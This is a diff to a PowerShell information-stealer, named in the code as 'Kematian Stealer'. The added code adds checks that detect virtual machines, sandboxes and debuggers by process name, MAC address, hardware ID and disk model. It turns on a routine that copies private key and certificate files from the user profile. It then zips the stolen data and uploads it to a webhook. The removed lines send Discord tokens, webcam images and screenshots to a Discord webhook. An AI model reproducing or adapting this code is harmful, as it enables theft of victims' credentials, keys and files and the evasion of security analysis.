@@ -1,10 +1,11 @@
-$webhook = "YOUR_WEBHOOK_HERE" 
-$debug = $false
-$blockhostsfile = $true
+$webhook = "http://127.0.0.1:8000/data" 
+$debug = $true
+$blockhostsfile = $false
 $criticalprocess = $true
 $melt = $false
 $fakeerror = $false
-$persistence = $true
+$persistence = $false
+$write_disk_only = $false
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -13,8 +14,6 @@ else {
     $ErrorActionPreference = 'SilentlyContinue'
     $ProgressPreference = 'SilentlyContinue'
 }
-
-$avatar = "https://i.imgur.com/DOIYOtp.gif"
 
 
 # Load WPF assemblies
@@ -98,11 +97,235 @@ function Invoke-TASKS {
     Backup-Data
 }
 
-function VMPROTECT {
-    $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
-    iex (iwr -uri $link -useb)
-    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
+Add-Type -AssemblyName System.Windows.Forms
+
+function ShowError {
+    param([string]$errorName)
+    [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error') | Out-Null
 }
+
+function Search-Mac {
+    $pc_mac = &(gcm gwm*) win32_networkadapterconfiguration | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress
+    $pc_macs = $pc_mac -join ","
+    return $pc_macs
+}
+
+function Search-IP {
+    $pc_ip = &(gcm I*e-Web*t*) -Uri "https://api.ipify.org" -UseB
+    $pc_ip = $pc_ip.Content
+    return $pc_ip
+}
+
+function InternetCheck {
+    try {
+        $result = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
+        Write-Host "[!] Internet connection is active." -ForegroundColor Green
+    }
+    catch {
+    ([Windows.Forms.MessageBox]::Show('INTERNET CONNECTION CHECK FAILED!', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error))
+        Stop-Process $pid -Force
+    }
+}
+
+
+function ProcessCountCheck {
+    $processes = gps | Measure-Object | Select-Object -ExpandProperty Count
+    if ($processes -lt 50) {
+        [System.Windows.Forms.MessageBox]::Show('PROCESS COUNT CHECK FAILED !', '', 'OK', 'Error')
+        Stop-Process $pid -Force
+    }
+}
+
+function RecentFileActivity {
+    $file_Dir = "$ENV:APPDATA/microsoft/windows/recent"
+    $file = Get-ChildItem -Path $file_Dir -Recurse
+    #if number of files is less than 20
+    if ($file.Count -lt 20) {
+        System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
+        Stop-Process $pid -Force
+    }
+}
+
+function TestDriveSize {
+    $drives = Get-Volume | Where-Object { $_.DriveLetter -ne $null } | Select-Object -ExpandProperty DriveLetter
+    $driveSize = 0
+    foreach ($drive in $drives) {
+        $driveSize += (Get-Volume -DriveLetter $drive).Size
+    }
+    $driveSize = $driveSize / 1GB
+    if ($driveSize -lt 50) {
+        [Windows.Forms.MessageBox]::Show('DRIVE SIZE CHECK FAILED !', '', 'OK', 'Error')
+        Stop-Process $pid -Force
+    }
+
+}
+
+function Search-HWID {
+    $hwid = &(gcm gwm*) -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
+    return $hwid
+}
+
+function Search-Username {
+    $getuser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $username = $getuser.Split("\")[1]
+    return $username
+}
+
+function Invoke-ANTITOTAL {
+    $anti_functions = @(
+        "InternetCheck",
+        "ProcessCountCheck",
+        "RecentFileActivity",
+        "TestDriveSize"
+    )
+
+    #foreach ($func in $anti_functions) {
+    #    Invoke-Expression "$func"
+    #}
+    $urls = @(
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
+    )
+
+    $functions = @(
+        "Search-Mac",
+        "Search-IP",
+        "Search-HWID",
+        "Search-Username"
+    )
+
+    $data = @()
+    foreach ($func in $functions) {
+        $data += Invoke-Expression "$func"
+    }
+    foreach ($url in $urls) {
+        $blacklist = &(gcm I*e-Web*t*) -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
+        if ($null -ne $blacklist) {
+            foreach ($item in $blacklist -split "`n") {
+                if ($data -contains $item) {
+                    ShowError $item
+                    Stop-Process $pid -Force
+                }
+            }
+        }
+    }
+}
+
+function ram_check {
+    $ram = (&(gcm gwm*) -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
+    if ($ram -lt 6) {
+        ([System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error'))
+        Stop-Process $pid -Force
+    }
+}
+
+
+function VMPROTECT {
+    if (Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll") { Stop-Process $pid -Force }
+    ram_check           
+    #triage detection
+    $d = wmic diskdrive get model
+    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
+        ShowError "QEMU HARDDISK"
+        Stop-Process $pid -Force
+    }    
+    $processNames = @(
+        "32dbg",
+        "64dbgx",
+        "autoruns",
+        "autoruns64",
+        "autorunsc",
+        "autorunsc64",
+        "ciscodump",
+        "df5serv",
+        "die",
+        "dumpcap",
+        "efsdump",
+        "etwdump",
+        "fakenet",
+        "fiddler",
+        "filemon",
+        "hookexplorer",
+        "httpdebugger",
+        "httpdebuggerui",
+        "ida",
+        "ida64",
+        "idag",
+        "idag64",
+        "idaq",
+        "idaq64",
+        "idau",
+        "idau64",
+        "idaw",
+        "immunitydebugger",
+        "importrec",
+        "joeboxcontrol",
+        "joeboxserver",
+        "ksdumperclient",
+        "lordpe",
+        "ollydbg",
+        "pestudio",
+        "petools",
+        "portmon",
+        "prl_cc",
+        "prl_tools",
+        "proc_analyzer",
+        "processhacker",
+        "procexp",
+        "procexp64",
+        "procmon",
+        "procmon64",
+        "qemu-ga",
+        "qga",
+        "regmon",
+        "reshacker",
+        "resourcehacker",
+        "sandman",
+        "sbiesvc",
+        "scylla",
+        "scylla_x64",
+        "scylla_x86",
+        "sniff_hit",
+        "sysanalyzer",
+        "sysinspector",
+        "sysmon",
+        "tcpdump",
+        "tcpview",
+        "tcpview64",
+        "udpdump",
+        "vboxcontrol",
+        "vboxservice",
+        "vboxtray",
+        "vgauthservice",
+        "vm3dservice",
+        "vmacthlp",
+        "vmsrvc",
+        "vmtoolsd",
+        "vmusrvc",
+        "vmwaretray",
+        "vmwareuser",
+        "vt-windows-event-stream",
+        "windbg",
+        "wireshark",
+        "x32dbg",
+        "x64dbg",
+        "x96dbg",
+        "xenservice"
+    )
+    $foundProcesses = gps | Where-Object { $processNames -contains $_.Name.ToLower() } | Select-Object -ExpandProperty Name
+    if ($null -ne $foundProcesses) {
+        Write-Host "[!] Found the following processes:" -ForegroundColor Red
+        $foundProcesses -join "`n" | Write-Host
+        ShowError $foundProcesses
+        Stop-Process $pid -Force
+    }  
+    if ($null -eq $foundProcesses) {
+        Invoke-ANTITOTAL
+    }
+}
+VMPROTECT
 
 
 function Request-Admin {
@@ -243,30 +466,22 @@ function Backup-Data {
     function diskdata {
         $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
         $results = foreach ($disk in $disks) {
-            try {
-                $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
-                $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
-                $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
-                $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
-                $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
-            }
-            catch {
-                $SizeOfDisk = 0
-                $FreeSpace = 0
-                $FreePercent = 0
-                $usedspace = 0
-                $usedpercent = 0
-            }
-
+            $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
+            $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
+            $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
+            $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
+            $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
             [PSCustomObject]@{
                 Drive             = $disk.Name
                 "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                 "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                 "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
             }
+            Write-Output ""  
         }
         $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
     }
+    
     $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
     $alldiskinfo = $alldiskinfo.Trim()
 
@@ -800,20 +1015,20 @@ function Backup-Data {
     $invokewebcam.WaitForExit()
 
     # Works since most victims will have a weak password which can be bruteforced
-    #function ExportPrivateKeys {
-    #    $privatekeysfolder = "$important_files\Certificates and Private Keys"
-    #    New-Item -ItemType Directory -Path $privatekeysfolder -Force | Out-Null
-    #    $sourceDirectory = "$env:userprofile"
-    #    $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
-    #
-    #    foreach ($extension in $fileExtensions) {
-    #        $foundFiles = Get-ChildItem -Path $sourceDirectory -Filter $extension -File -Recurse
-    #        foreach ($file in $foundFiles) {
-    #            Copy-Item -Path $file.FullName -Destination $privatekeysfolder -Force
-    #        }
-    #    }
-    #}
-    #ExportPrivateKeys
+    function ExportPrivateKeys {
+        $privatekeysfolder = "$important_files\Certificates and Private Keys"
+        New-Item -ItemType Directory -Path $privatekeysfolder -Force | Out-Null
+        $sourceDirectory = "$env:userprofile"
+        $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
+
+        foreach ($extension in $fileExtensions) {
+            $foundFiles = Get-ChildItem -Path $sourceDirectory -Filter $extension -File -Recurse
+            foreach ($file in $foundFiles) {
+                Copy-Item -Path $file.FullName -Destination $privatekeysfolder -Force
+            }
+        }
+    }
+    ExportPrivateKeys
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
@@ -928,260 +1143,40 @@ function Backup-Data {
         $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
         $dirs | ForEach-Object { Remove-Item $_ -Force }
     } while ($dirs.Count -gt 0)
-    
-    Write-Host "[!] Getting information about the extracted data" -ForegroundColor Green
-    
-    function ProcessCookieFiles {
-        $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
-        $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
-        foreach ($file in $cookieFiles) {
-            $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
-            $fileContents = Get-Content -Path $file.FullName
-            $domainCounts = @{}
-            foreach ($line in $fileContents) {
-                if ($line -match "^\s*(\S+)\s") {
-                    $domain = $matches[1].TrimStart('.')
-                    if ($domainCounts.ContainsKey($domain)) {
-                        $domainCounts[$domain]++
-                    }
-                    else {
-                        $domainCounts[$domain] = 1
-                    }
-                }
-            }
-            $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
-            $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
-            Set-Content -Path $outputFilePath -Value $outputString
-        }
-    }
-    ProcessCookieFiles 
-    
-    # Send info about the data in the Kematian.zip
-    function kematianinfo {    
-        $messaging_sessions_info = if (Test-Path $folder_messaging) {
-            $messaging_sessions_content = Get-ChildItem -Path $folder_messaging -Directory | ForEach-Object { $_.Name -replace '\..+$' }
-            if ($messaging_sessions_content) {
-                $messaging_sessions_content -join ' | '
-            }
-            else {
-                'False'
-            }
-        }
-        else {
-            'False'
-        }
 
-        $gaming_sessions_info = if (Test-Path $folder_gaming) {
-            $gaming_sessions_content = Get-ChildItem -Path $folder_gaming -Directory | ForEach-Object { $_.Name -replace '\..+$' }
-            if ($gaming_sessions_content) {
-                $gaming_sessions_content -join ' | '
-            }
-            else {
-                'False'
-            }
-        }
-        else {
-            'False'
-        }
+    $zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
+    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"
 
-        $wallets_found_info = if (Test-Path $folder_crypto) {
-            $wallets_found_content = Get-ChildItem -Path $folder_crypto -Directory | ForEach-Object { $_.Name -replace '\..+$' }
-            if ($wallets_found_content) {
-                $wallets_found_content -join ' | '
-            }
-            else {
-                'False'
-            }
-        }
-        else {
-            'False'
-        }
+    Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
 
-        $vpn_accounts_info = if (Test-Path $folder_vpn) {
-            $vpn_accounts_content = Get-ChildItem -Path $folder_vpn -Directory | ForEach-Object { $_.Name -replace '\..+$' }
-            if ($vpn_accounts_content) {
-                $vpn_accounts_content -join ' | '
-            }
-            else {
-                'False'
-            }
-        }
-        else {
-            'False'
-        }
 
-        $email_clients_info = if (Test-Path $folder_email) {
-            if ((Get-ChildItem -Path $folder_email).Count -gt 0) {
-                'True'
-            }
-            else {
-                'False'
-            }
-        }
-        else {
-            'False'
-        }
+    Write-Host $ZipFilePath
 
-        $important_files_info = if (Test-Path $important_files) {
-            $file_count = (Get-ChildItem -Path $important_files -File).Count
-            if ($file_count -gt 0) {
-            ($file_count)
-            }
-            else {
-                'False'
-            }
-        }
-        else {
-            'False'
-        }
-
-        $browser_data_info = if (Test-Path $browser_data) {
-            $browser_data_content = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*" -File | ForEach-Object { $_.Name -replace '\..+$' }
-            $browser_data_content = $browser_data_content -replace "^cookies_netscape_|-Browser$", ""
-            if ($browser_data_content) {
-                $browser_data_content -join ' | '
-            }
-            else {
-                'False'
-            }
-        }
-        else {
-            'False'
-        }
-
-        $ftp_accounts_info = if (Test-Path $ftp_clients) {
-            $ftp_accounts_content = Get-ChildItem -Path $ftp_clients -Directory | ForEach-Object { $_.Name -replace '\..+$' }
-            if ($ftp_accounts_content) {
-                $ftp_accounts_content -join ' | '
-            }
-            else {
-                'False'
-            }
-        }
-        else {
-            'False'
-        }
-
-        # Add data to webhook
-        $webhookData = "Messaging Sessions: $messaging_sessions_info `nGaming Sessions: $gaming_sessions_info `nCrypto Wallets: $wallets_found_info `nVPN Accounts: $vpn_accounts_info `nEmail Clients: $email_clients_info `nImportant Files: $important_files_info `nBrowser Data: $browser_data_info `nFTP Clients: $ftp_accounts_info"
-        return $webhookData
-    }     
-    $kematainwebhook = kematianinfo
-    
-    # Send discord tokens in webhook message 
-    $discord_tokens = if (Test-Path "$folderformat\discord.json") {
-        $jsonContent = Get-Content -Path "$folderformat\discord.json" -Raw
-        $tokenMatches = [regex]::Matches($jsonContent, '"token": "(.*?)"')
-    
-        if ($tokenMatches.Count -gt 0) {
-            $tokens = foreach ($match in $tokenMatches) {
-                $token = $match.Groups[1].Value
-                $token
-            }
-            $tokens -join "`n`n"
-        }
-        else {
-            'False'
-        }
-    }
-
-    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
-    $embed_and_body = @{
-        "username"   = "Kematian"
-        "color"      = "15105570"
-        "avatar_url" = "https://i.imgur.com/6w6qWCB.jpeg"
-        "url"        = "https://discord.com/invite/WJCNUpxnrE"
-        "embeds"     = @(
-            @{
-                "title"       = "Kematian Stealer"
-                "url"         = "https://github.com/ChildrenOfYahweh/Kematian-Stealer"
-                "description" = "New victim info collected !"
-                "color"       = "15105570"
-                "footer"      = @{
-                    "text" = "Made by Kdot, Chainski and EvilByteCode"
-                }
-                "thumbnail"   = @{
-                    "url" = "https://i.imgur.com/6w6qWCB.jpeg"
-                }
-                "fields"      = @(
-                    @{
-                        "name"  = ":satellite: Network"
-                        "value" = "``````$networkinfo``````"
-                    },
-                    @{
-                        "name"  = ":bust_in_silhouette: User Information"
-                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
-                    },
-                    @{
-                        "name"  = ":shield: Antivirus"
-                        "value" = "``````$avlist``````"
-                    },
-                    @{
-                        "name"  = ":computer: Hardware"
-                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
-                    },
-                    @{
-                        "name"  = ":floppy_disk: Disk"
-                        "value" = "``````$alldiskinfo``````"
-                    },
-                    @{
-                        "name"  = ":file_folder: Kematian File Info"
-                        "value" = "``````$kematainwebhook``````"
-                    },
-                    @{
-                        "name"  = ":key: Discord Token(s)"
-                        "value" = "```````n$discord_tokens``````"
-                    }
-                )
-            }
-        )
-    }
-
-    $payload = $embed_and_body | ConvertTo-Json -Depth 10
-    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
-    
-    # Send webcam
-    
-    $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
-    foreach ($item in $items) { $name = $item.Name; Move-Item "$($item.FullName)" $folder_general -Force }
-    $jpegfiles = Get-ChildItem -Path $folder_general -Filter out*.jpg
-    foreach ($jpegfile in $jpegfiles) {
-        $name = $jpegfile.Name
-        $messageContent = @{content = "## :camera: Webcam" ; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
+    if ( -not ($write_disk_only)) {    
+        $httpClient = [Net.Http.HttpClient]::new()
         $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-        $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
-        $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0; $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
-        $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json"); $multipartContent.Add($streamContent, "payload_json")
-        $fileStream = [IO.File]::OpenRead("$folder_general\$name"); $fileContent = [Net.Http.StreamContent]::new($fileStream)
-        $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png"); $multipartContent.Add($fileContent, "file", "$folder_general\$name")
-        $httpClient.PostAsync($webhook, $multipartContent).Result
+    
+        $fileStream = [IO.File]::OpenRead($zipFilePath)
+        $fileContent = [Net.Http.StreamContent]::new($fileStream)
+        $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+        $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
+    
+        $response = $httpClient.PostAsync($webhook, $multipartContent).Result
+        $responseContent = $response.Content.ReadAsStringAsync().Result
+    
+        Write-Output $responseContent
+    
+        $fileStream.Dispose()
+        $httpClient.Dispose()
+        $multipartContent.Dispose()
+        $fileContent.Dispose()
+
+        Remove-Item "$zipFilePath" -Force
     }
-
-    # Send screenshot
-    $messageContent = @{content = "## :desktop: Screenshot"; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
-    $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-    $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
-    $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
-    $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
-    $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
-    $multipartContent.Add($streamContent, "payload_json"); $fileStream = [IO.File]::OpenRead("$folder_general\screenshot.png")
-    $fileContent = [Net.Http.StreamContent]::new($fileStream); $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
-    $multipartContent.Add($fileContent, "file", "screenshot.png"); $httpClient.PostAsync($webhook, $multipartContent).Result
-
-    # Send exfiltrated data
-    $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
-    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"; Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
-    $messageContent = @{username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
-    $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new(); $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent)
-    $messageContentStream = [IO.MemoryStream]::new(); $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
-    $streamContent = [Net.Http.StreamContent]::new($messageContentStream); $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
-    $multipartContent.Add($streamContent, "payload_json"); $fileStream = [IO.File]::OpenRead($zipFilePath)
-    $fileContent = [Net.Http.StreamContent]::new($fileStream); $multipartContent.Add($fileContent, "file", $zipFilePath); $httpClient.PostAsync($webhook, $multipartContent).Result
 
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
 
     # cleanup
-    Remove-Item "$zipFilePath" -Force
     Remove-Item "$env:appdata\Kematian" -Force -Recurse
 }
 
